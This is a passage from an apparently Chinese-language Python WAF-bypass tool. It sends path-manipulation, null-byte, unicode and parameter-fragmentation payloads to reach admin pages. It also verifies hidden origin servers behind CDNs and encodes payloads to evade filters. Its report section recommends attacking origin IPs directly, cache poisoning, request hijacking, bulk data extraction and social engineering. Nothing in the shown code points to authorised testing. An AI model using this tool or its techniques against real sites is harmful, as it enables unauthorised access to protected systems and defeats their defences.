                    '/admin/..;/',
                    '\\admin'  # 反斜杠
                ]
            },
            
            # 4. 参数片段化
            {
                'name': 'parameter_fragmentation',
                'payloads': [
                    '?id=1&%0aid=2',  # 换行符分割
                    '?id=1&%09id=2',  # Tab分割
                    '?id=1&%20id=2',  # 空格分割
                    '?id[]=1&id[]=2',  # 数组形式
                    '?id=1&\rid=2',   # 回车分割
                ]
            },
            
            # 5. HTTP/2 伪头部（如果支持）
            {
                'name': 'http2_pseudo_headers',
                'headers': {
                    ':method': 'GET',
                    ':path': '/admin',
                    ':authority': 'localhost',  # 伪造authority
                    ':scheme': 'https'
                }
            }
        ]
        
        async with aiohttp.ClientSession() as session:
            for test in edge_case_tests:
                if 'payloads' in test:
                    # URL操纵测试
                    for payload in test['payloads']:
                        test_url = f"{parsed.scheme}://{parsed.netloc}{payload}"
                        if parsed.query:
                            test_url += f"?{parsed.query}"
                        
                        try:
                            headers = self.bypass_headers.copy()
                            
                            # 特殊处理：空字节和Unicode
                            if test['name'] == 'null_byte_injection':
                                # 某些服务器会在空字节处截断
                                headers['X-Original-URL'] = payload
                            elif test['name'] == 'unicode_normalization':
                                # 添加Unicode接受头
                                headers['Accept-Charset'] = 'utf-8, iso-8859-1;q=0.5'
                            
                            async with session.get(
                                test_url,
                                headers=headers,
                                ssl=False,
                                allow_redirects=False,
                                timeout=aiohttp.ClientTimeout(total=5)
                            ) as resp:
                                # 检查绕过成功的标志
                                if resp.status in [200, 301, 302]:
                                    content = await resp.text()
                                    
                                    # 检查是否真的访问到了管理页面
                                    admin_indicators = [
                                        'admin', 'dashboard', 'panel', 'control',
                                        'management', 'configuration', 'settings'
                                    ]
                                    
                                    if any(indicator in content.lower() for indicator in admin_indicators):
                                        result = BypassResult(
                                            success=True,
                                            method='edge_cases',
                                            url=test_url,
                                            details={
                                                'technique': test['name'],
                                                'payload': payload,
                                                'content': content,
                                                'headers': dict(resp.headers)
                                            },
                                            confidence=0.5,  # 临时值，立即重新评估
                                            risk_level='medium'
                                        )
                                        # 【数学引擎】动态置信度评估
                                        result.confidence = self.scorer.assess(result)
                                        return result
                                    
                                    # 即使没有明确的管理页面标志，某些payload也算成功
                                    if test['name'] in ['null_byte_injection', 'unicode_normalization']:
                                        if resp.status == 200 and len(content) > 100:
                                            result = BypassResult(
                                                success=True,
                                                method='edge_cases',
                                                url=test_url,
                                                details={
                                                    'technique': test['name'],
                                                    'payload': payload,
                                                    'note': 'Potential bypass detected',
                                                    'content': content,
                                                    'headers': dict(resp.headers)
                                                },
                                                confidence=0.5  # 临时值，立即重新评估
                                            )
                                            # 【数学引擎】动态置信度评估
                                            result.confidence = self.scorer.assess(result)
                                            return result
                                            
                        except aiohttp.ClientError:
                            continue
                        except Exception:
                            continue
                
                elif 'headers' in test and test['name'] == 'http2_pseudo_headers':
                    # HTTP/2 特殊处理（需要支持HTTP/2的客户端）
                    # 这里简化处理，使用普通头部模拟  技术债务 等待完整实现  我不会了
                    try:
                        headers = self.bypass_headers.copy()
                        headers.update({
                            'X-HTTP2-Authority': 'localhost',
                            'X-Original-Method': 'GET',
                            'X-Original-Path': '/admin'
                        })
                        
                        async with session.get(
                            url,
                            headers=headers,
                            ssl=False
                        ) as resp:
                            if resp.status == 200:
                                return BypassResult(
                                    success=True,
                                    method='edge_cases',
                                    url=url,
                                    details={
                                        'technique': 'http2_simulation',
                                        'headers': headers
                                    },
                                    confidence=0.5
                                )
                    except:
                        continue
        
        return BypassResult(
            success=False,
            method='edge_cases',
            url=url,
            details={
                'error': '所有边缘案例攻击失败，目标可能有完善的防护机制',
                'techniques_tested': [test['name'] for test in edge_case_tests],
                'payloads_tested': sum(len(test.get('payloads', [])) for test in edge_case_tests if 'payloads' in test),
                'failure_reason': 'edge_case_attacks_blocked_or_normalized'
            }
        )
    #重写严格验证！
    async def _verify_origin_servers(self, servers: List[OriginServer], domain: str) -> List[OriginServer]:
        """增强的源站服务器验证"""
        if not hasattr(self, '_target_fingerprint'):
            await self._get_target_fingerprint(f"https://{domain}")
        
        verified_servers = []
        
        for server in servers:
            verification_score = 0.0
            match_details = []
            
            try:
                # 测试HTTP和HTTPS
                for scheme in ['http', 'https']:
                    try:
                        url = f"{scheme}://{server.ip}"
                        async with aiohttp.ClientSession() as session:
                            headers = {'Host': domain, 'User-Agent': 'Mozilla/5.0'}
                            async with session.get(
                                url,
                                headers=headers,
                                timeout=aiohttp.ClientTimeout(total=5),
                                ssl=False
                            ) as resp:
                                if resp.status not in [200, 301, 302, 403]:
                                    continue
                                
                                content = await resp.text()
                                
                                # 1. 验证标题匹配
                                if self._target_fingerprint['title']:
                                    title_match = re.search(r'<title[^>]*>(.*?)</title>', content, re.IGNORECASE)
                                    if title_match and title_match.group(1).strip() == self._target_fingerprint['title']:
                                        verification_score += 0.3
                                        match_details.append('title_match')
                                
                                # 2. 验证meta标签
                                if self._target_fingerprint['meta_keywords']:
                                    if self._target_fingerprint['meta_keywords'] in content:
                                        verification_score += 0.2
                                        match_details.append('meta_keywords')
                                
                                # 3. 验证静态资源
                                matched_resources = 0
                                for resource in self._target_fingerprint['static_resources']:
                                    if resource in content:
                                        matched_resources += 1
                                if self._target_fingerprint['static_resources']:
                                    resource_match_ratio = matched_resources / len(self._target_fingerprint['static_resources'])
                                    verification_score += resource_match_ratio * 0.25
                                    if resource_match_ratio > 0.5:
                                        match_details.append(f'resources_{int(resource_match_ratio*100)}%')
                                
                                # 4. 验证响应大小
                                body_size = len(content)
                                if self._target_fingerprint['body_size_range'][0] <= body_size <= self._target_fingerprint['body_size_range'][1]:
                                    verification_score += 0.15
                                    match_details.append('size_match')
                                
                                # 5. 验证DOM模式
                                dom_matches = 0
                                for pattern in self._target_fingerprint['dom_patterns'][:3]:
                                    if pattern in content:
                                        dom_matches += 1
                                if self._target_fingerprint['dom_patterns'] and dom_matches > 0:
                                    verification_score += 0.1
                                    match_details.append('dom_patterns')
                                
                                # 如果验证分数足够高，标记为已验证
                                if verification_score >= 0.5:
                                    server.is_verified = True
                                    server.confidence = min(server.confidence * (1 + verification_score), 1.0)
                                    server.services['verification'] = f"score={verification_score:.2f}, matches={','.join(match_details)}"
                                    verified_servers.append(server)
                                    self.logger.info(f"[+] 验证通过: {server.ip} (分数: {verification_score:.2f})")
                                    break
                                
                    except Exception as e:
                        continue
                        
            except Exception as e:
                self.logger.warning(f"[!] 验证失败 {server.ip}: {type(e).__name__} - {str(e)[:50]}")
                
            # 如果验证分数太低，降低置信度但仍保留
            if verification_score < 0.5 and verification_score > 0.2:
                server.confidence *= 0.5
                server.services['verification'] = f"partial_match={verification_score:.2f}"
                verified_servers.append(server)
        
        return verified_servers
    
    def _generate_recommendations(self, results: Dict) -> List[str]:
        """生成攻击建议"""
        recommendations = []
        
        if results['origin_servers']:
            recommendations.append(
                f"发现 {len(results['origin_servers'])} 个源站IP，"
                f"建议直接攻击置信度最高的: {results['origin_servers'][0]['ip']}"
            )
        
        if results['successful_bypasses']:
            best_bypass = max(results['successful_bypasses'], 
                            key=lambda x: x.get('confidence', 0))
            recommendations.append(
                f"最有效的绕过方法: {best_bypass['method']} "
                f"(置信度: {best_bypass.get('confidence', 0):.1%})"
            )
        
        if results['waf_detected'] == 'cloudflare':
            recommendations.append(
                "检测到Cloudflare，建议: 1) 使用WebSocket绕过 "
                "2) 寻找未被保护的子域名 3) 利用缓存规则"
            )
        
        # 走私漏洞专门建议
        if results.get('smuggling_scan', {}).get('vulnerable'):
            smuggling_info = results['smuggling_scan']
            recommendations.append(
                f"发现HTTP请求走私漏洞！技术: {smuggling_info['technique']}, "
                f"建议: 1) 利用此漏洞绕过WAF 2) 进行缓存中毒攻击 3) 请求劫持攻击"
            )
        
        # GraphQL漏洞专门建议
        if results.get('graphql_scan', {}).get('vulnerable'):
            graphql_info = results['graphql_scan']
            endpoint = graphql_info['endpoint']
            success_rate = graphql_info['successful_queries'] / graphql_info['total_queries']
            introspection = "可用" if graphql_info['introspection_available'] else "被禁用"
            
            recommendations.append(
                f"发现GraphQL批处理漏洞！端点: {endpoint}, 成功率: {success_rate:.1%}, 内省: {introspection}, "
                f"建议: 1) 批量数据提取 2) 权限绕过测试 3) 敏感信息泄露攻击"
            )
        
        if not results['origin_servers'] and not results['successful_bypasses']:
            recommendations.append(
                "未找到有效绕过方法，建议: 1) 深度子域名枚举 "
                "2) 历史DNS记录分析 3) 社工获取真实IP"
            )
        
        return recommendations
    
    def _extract_domain(self, url: str) -> str:
        """提取域名"""
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc.split(':')[0]
    
    def _is_cdn_ip(self, ip: str) -> bool:
        """检查是否为CDN IP"""
        try:
            ip_obj = ipaddress.ip_address(ip)
            
            # CDN IP范围数据库
            cdn_ranges = {
                'cloudflare': [
                    '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22',
                    '103.31.4.0/22', '141.101.64.0/18', '108.162.192.0/18',
                    '190.93.240.0/20', '188.114.96.0/20', '197.234.240.0/22',
                    '198.41.128.0/17', '162.158.0.0/15', '172.64.0.0/13',
                    '131.0.72.0/22', '104.16.0.0/13', '104.24.0.0/14'
                ],
                'akamai': [
                    '23.0.0.0/12', '23.32.0.0/11', '23.64.0.0/14', '23.72.0.0/13',
                    '23.192.0.0/11', '23.192.0.0/11', '2.16.0.0/13', '2.22.0.0/15',
                    '69.192.0.0/16', '72.246.0.0/15', '88.221.0.0/16', '92.122.0.0/15',
                    '95.100.0.0/15', '96.6.0.0/15', '96.16.0.0/15', '104.64.0.0/10'
                ],
                'fastly': [
                    '23.235.32.0/20', '43.249.72.0/22', '103.244.50.0/24',
                    '103.245.222.0/23', '103.245.224.0/24', '104.156.80.0/20',
                    '151.101.0.0/16', '157.52.64.0/18', '167.82.0.0/17',
                    '167.82.128.0/20', '167.82.160.0/20', '167.82.224.0/20'
                ],
                'cloudfront': [
                    '13.32.0.0/15', '13.35.0.0/16', '13.48.0.0/13', '13.54.0.0/15',
                    '13.56.0.0/16', '13.59.0.0/16', '13.64.0.0/11', '13.96.0.0/12',
                    '13.112.0.0/14', '13.124.0.0/14', '13.208.0.0/13', '13.224.0.0/14',
                    '52.0.0.0/11', '52.32.0.0/14', '52.40.0.0/14', '52.48.0.0/14',
                    '52.56.0.0/14', '52.64.0.0/13', '52.72.0.0/13', '52.80.0.0/13'
                ],
                'incapsula': [
                    '45.60.0.0/16', '45.223.0.0/16', '103.28.248.0/22',
                    '107.154.0.0/16', '149.126.72.0/21', '185.11.124.0/22',
                    '185.11.146.0/23', '192.230.64.0/18', '198.143.32.0/19',
                    '199.83.128.0/17'
                ]
            }
            
            # 检查所有CDN范围
            for cdn_name, ranges in cdn_ranges.items():
                for cidr in ranges:
                    try:
                        if ip_obj in ipaddress.ip_network(cidr):
                            return True
                    except ValueError:
                        continue
            
            # 额外检查：AWS/GCP/Azure等云服务商IP
            # 这些经常被用作CDN或反向代理
            cloud_keywords = ['amazonaws', 'googleusercontent', 'azure', 'alibabacloud']
            
            # 反向DNS检查 - 异步修复（在同步函数中，需要特殊处理）
            # 注意：这个函数是同步的，所以创建异步任务但不等待
            # 为了避免复杂化，暂时注释掉反向DNS检查
            # TODO: 考虑将_is_cdn_ip改为异步函数，或者使用线程池
            try:
                # import socket
                # hostname = socket.gethostbyaddr(ip)[0].lower()
                # for keyword in cloud_keywords:
                #     if keyword in hostname:
                #         return True
                pass  # 暂时跳过反向DNS检查避免阻塞
            except:
                pass
            
        except Exception:
            pass
        
        return False
    
    def _create_chunked_payload(self, data: str) -> bytes:
        """创建分块传输编码payload"""
        chunks = []
        chunk_size = 1
        
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i + chunk_size]
            chunks.append(f"{len(chunk):X}\r\n{chunk}\r\n".encode())
        
        chunks.append(b"0\r\n\r\n")
        return b''.join(chunks)
    
    # 编码方法实现
    def _url_encode(self, text: str) -> str:
        """URL编码"""
        return urllib.parse.quote(text, safe='')
    
    def _double_url_encode(self, text: str) -> str:
        """双重URL编码"""
        return urllib.parse.quote(urllib.parse.quote(text, safe=''), safe='')
    
    def _unicode_encode(self, text: str) -> str:
        """Unicode编码"""
        return ''.join(f'\\u{ord(c):04x}' for c in text)
    
    def _utf8_overlong_encode(self, text: str) -> str:
        """UTF-8 overlong编码"""
        # 简化示例  技术债务
        encoded = []
        for char in text:
            if char == '/':
                encoded.append('%c0%af')  # Overlong encoding of '/'
            elif char == '.':
                encoded.append('%c0%ae')  # Overlong encoding of '.'
            else:
                encoded.append(urllib.parse.quote(char))
        return ''.join(encoded)
    
    def _mixed_case_encode(self, text: str) -> str:
        """大小写混淆编码"""
        # 对SQL关键字进行大小写混淆
        keywords = ['select', 'union', 'from', 'where', 'and', 'or']
        result = text
        
        for keyword in keywords:
            if keyword in result.lower():
                # 随机大小写
                mixed = ''.join(
                    c.upper() if random.random() > 0.5 else c.lower() 
                    for c in keyword
                )
                result = re.sub(keyword, mixed, result, flags=re.IGNORECASE)
        
        return result
    
    def _html_entity_encode(self, text: str) -> str:
        """HTML实体编码"""
        return ''.join(f'&#{ord(c)};' for c in text)
    
    def _base64_encode(self, text: str) -> str:
        """Base64编码"""
        return base64.b64encode(text.encode()).decode()
    
    def _hex_encode(self, text: str) -> str:
        """十六进制编码"""
        return ''.join(f'%{ord(c):02x}' for c in text)
    
    def _cache_key(self, *args) -> str:
        """生成缓存键"""
        return hashlib.md5('|'.join(str(arg) for arg in args).encode()).hexdigest()
    
    async def _cached_operation(self, cache_type: str, key: str, operation: Callable, *args, **kwargs) -> Any:
        """通用缓存操作"""
        cache_key = self._cache_key(key)
        
        # 检查缓存
        if cache_type in self._cache and cache_key in self._cache[cache_type]:
            cache_entry = self._cache[cache_type][cache_key]
            if time.time() - cache_entry['time'] < self._cache_ttl:
                self._cache_hits += 1
                self.logger.debug(f"[缓存] 命中 {cache_type}: {key}")
                return cache_entry['result']
        
        # 缓存未命中，执行操作
        self._cache_misses += 1
        result = await operation(*args, **kwargs)
        
        # 存入缓存
        if cache_type not in self._cache:
            self._cache[cache_type] = {}
        self._cache[cache_type][cache_key] = {
            'result': result,
            'time': time.time()
        }
        
        return result
    
    def generate_report(self, results: Dict) -> str:
        """生成详细的绕过报告"""
        report = []
        report.append("=" * 80)
        report.append("WAF绕过分析报告")
        report.append("=" * 80)
        report.append(f"目标: {results['target']}")
        report.append(f"时间: {results['timestamp']}")
        report.append(f"检测到的WAF: {results['waf_detected'] or '未检测到'}")
        
        if results['origin_servers']:
            report.append(f"\n[源站发现] 找到 {len(results['origin_servers'])} 个潜在源站:")
            for server in results['origin_servers'][:5]:  # 只显示前5个
                report.append(f"  - {server['ip']} (置信度: {server['confidence']:.1%}, "
                            f"方法: {server['method']}, 已验证: {server['verified']})")
        
        if results['successful_bypasses']:
            report.append(f"\n[绕过成功] {len(results['successful_bypasses'])} 种方法成功:")
            for bypass in results['successful_bypasses']:
                report.append(f"  - {bypass['method']} (置信度: {bypass['confidence']:.1%})")
                if 'url' in bypass:
                    report.append(f"    URL: {bypass['url']}")
        
        if results['failed_attempts']:
            report.append(f"\n[失败尝试] {len(results['failed_attempts'])} 种方法失败")
        
        # 走私漏洞扫描结果
        if 'smuggling_scan' in results:
            smuggling = results['smuggling_scan']
            if smuggling['vulnerable']:
                report.append(f"\n[走私漏洞] ⚠️ 发现HTTP请求走私漏洞！")
                report.append(f"  - 攻击技术: {smuggling['technique']}")
                report.append(f"  - 漏洞证据: {smuggling['evidence']}")
                report.append(f"  - 基准状态: {smuggling['baseline_status']} ({smuggling['baseline_time']:.2f}s)")
                report.append(f"  - 确认状态: {smuggling['confirmation_status']} ({smuggling['confirmation_time']:.2f}s)")
            else:
                report.append(f"\n[走私漏洞] ✓ 未发现HTTP请求走私漏洞")
        
        # GraphQL漏洞扫描结果
        if 'graphql_scan' in results:
            graphql = results['graphql_scan']
            if graphql['vulnerable']:
                report.append(f"\n[GraphQL漏洞] ⚠️ 发现GraphQL批处理漏洞！")
                report.append(f"  - 攻击端点: {graphql['endpoint']}")
                report.append(f"  - 漏洞证据: {graphql['evidence']}")
                report.append(f"  - 成功查询: {graphql['successful_queries']}/{graphql['total_queries']}")
                report.append(f"  - 置信度: {graphql['confidence']:.1%}")
                report.append(f"  - 内省状态: {'可用' if graphql['introspection_available'] else '被禁用'}")
            else:
                report.append(f"\n[GraphQL漏洞] ✓ 未发现GraphQL批处理漏洞")
        
        if results['recommendations']:
            report.append("\n[攻击建议]")
            for i, rec in enumerate(results['recommendations'], 1):
                report.append(f"  {i}. {rec}")
        
        report.append("\n[统计信息]")
        report.append(f"  总尝试次数: {self.stats['total_attempts']}")
        report.append(f"  成功绕过次数: {self.stats['successful_bypasses']}")
        report.append(f"  发现源站IP总数: {self.stats['origin_ips_found']}")
        report.append(f"  遇到的WAF类型: {', '.join(self.stats['waf_types_encountered'])}")
        
        # TLS-Client统计
        if TLS_CLIENT_AVAILABLE:
            total_requests = self.stats['tls_client_successes'] + self.stats['traditional_method_successes']
            if total_requests > 0:
                tls_success_rate = (self.stats['tls_client_successes'] / total_requests) * 100
                report.append(f"  TLS-Client成功率: {tls_success_rate:.1f}%")
                report.append(f"  TLS-Client请求: {self.stats['tls_client_successes']} 次")
                report.append(f"  传统方法请求: {self.stats['traditional_method_successes']} 次")
        
        report.append("\n[技术能力]")
        report.append("  源站发现技术: 9种 (含JARM指纹、SSL SAN分析)")
        report.append("  编码绕过技术: 8种 (含UTF-8 Overlong)")
        report.append("  高级绕过技术: 13种 (含边缘案例、请求走私)")
        report.append("  WAF指纹库: 8种主流WAF")
        report.append("  ⚡ HTTP请求走私: 智能化制导确认系统")
        report.append("    - 6种走私技术 (CL.TE, TE.CL, TE.TE + 变体)")
        report.append("    - 基准-探针-确认三步检测法")
        report.append("    - 时间异常和状态码异常双重分析")
        
        # TLS-Client能力 - 10种指纹极致优化
        if TLS_CLIENT_AVAILABLE:
            report.append(f"  浏览器指纹: {len(self.browser_profiles)}种")
            report.append("  TLS指纹伪装: ✓ JA3/JA3S/H2指纹 + GREASE + 密码套件顺序")
            
            # 指纹使用统计
            if any(self.stats['profile_usage'].values()):
                report.append("\n[指纹使用统计]")
                for profile, usage_count in self.stats['profile_usage'].items():
                    if usage_count > 0:
                        success_count = self.stats['profile_success'][profile]
                        success_rate = (success_count / usage_count) * 100
                        category = self.browser_profiles.get(profile, {}).get('category', 'unknown')
                        report.append(f"  {profile}: {usage_count}次使用, {success_rate:.1f}%成功率 ({category})")
                
                # 被封指纹
                if self.profile_rotation['blocked_profiles']:
                    report.append(f"  被封指纹: {', '.join(self.profile_rotation['blocked_profiles'])}")
        else:
            report.append("  TLS指纹伪装: ✗ 需要安装 tls-client 库")
        
        # Shodan状态
        if self.shodan_client:
            report.append("\n[Shodan集成]")
            report.append("  状态: ✓ 已启用")
            report.append("  功能: JARM搜索、Favicon哈希、SSL证书搜索、响应头匹配")
        else:
            report.append("\n[Shodan集成]")
            report.append("  状态: ✗ 未启用")
            report.append("  原因: 未配置API密钥或未安装shodan库")
        
        report.append("\n[缓存统计]")
        total_cache_requests = self._cache_hits + self._cache_misses
        if total_cache_requests > 0:
            hit_rate = (self._cache_hits / total_cache_requests) * 100
            report.append(f"  缓存命中率: {hit_rate:.1f}%")
            report.append(f"  缓存命中: {self._cache_hits} 次")
            report.append(f"  缓存未命中: {self._cache_misses} 次")
            report.append(f"  缓存类型: {', '.join(self._cache.keys())}")
        else:
            report.append("  暂无缓存统计数据")
        
        report.append("=" * 80)
        
        return '\n'.join(report)

    async def self_test(self) -> bool:
        """
        执行模块自检，确保所有核心依赖和功能都正常。
        返回 True 表示自检通过，否则返回 False。
        """
        self.logger.info("\n" + "="*50)
        self.logger.info("[*] WAFBypasser 模块启动自检...")
        self.logger.info("="*50)
        
        all_checks_passed = True
        
        # 1. 检查TLS-Client库
        if TLS_CLIENT_AVAILABLE and self.tls_sessions:
            self.logger.info("    [+] 依赖检查: TLS-Client 核心库 ... OK")
        else:
            self.logger.error("    [!] 依赖检查: TLS-Client 核心库 ... 失败! (绕过能力严重受限)")
            all_checks_passed = False

        # 2. 检查Shodan API Key
        if self.shodan_client:
            try:
                # 异步执行同步的API info调用
                shodan_info = await asyncio.to_thread(self.shodan_client.info)
                credits = shodan_info.get('query_credits', 0)
                self.logger.info(f"    [+] 依赖检查: Shodan API Key ... OK (查询点数: {credits})")
            except Exception as e:
                self.logger.error(f"    [!] 依赖检查: Shodan API Key ... 失败! ({e})")
                all_checks_passed = False
        else:
            self.logger.warning("    [~] 依赖检查: Shodan API ... 未配置 (部分源站发现功能不可用)")

        # 3. 核心功能连通性测试
        try:
            test_url = "https://www.cloudflare.com" # 一个必然存在的测试目标
            self.logger.info(f"    [*] 连通性测试: 正在向 {test_url} 发送探测请求...")
            resp = await self._make_tls_request(test_url, profile='chrome_120')
            if 200 <= resp['status_code'] < 400:
                self.logger.info(f"    [+] 连通性测试: TLS 请求引擎 ... OK (状态码: {resp['status_code']})")
            else:
                self.logger.error(f"    [!] 连通性测试: TLS 请求引擎 ... 失败 (状态码: {resp['status_code']})")
                all_checks_passed = False
        except Exception as e:
            self.logger.error(f"    [!] 连通性测试: TLS 请求引擎 ... 异常! ({type(e).__name__} - {e})")
            all_checks_passed = False

        self.logger.info("="*50)
        if all_checks_passed:
            self.logger.info("[+] 自检完成：所有核心功能正常。模块准备就绪！")
        else:
            self.logger.error("[!] 自检失败：部分核心功能异常，请检查配置和依赖！")
        self.logger.info("="*50 + "\n")
        
        return all_checks_passed


if __name__ == "__main__":
    async def quick_test():
        bypasser = WAFBypasser()  # 现在自动读取环境变量
        await bypasser.self_test()
    
    asyncio.run(quick_test())
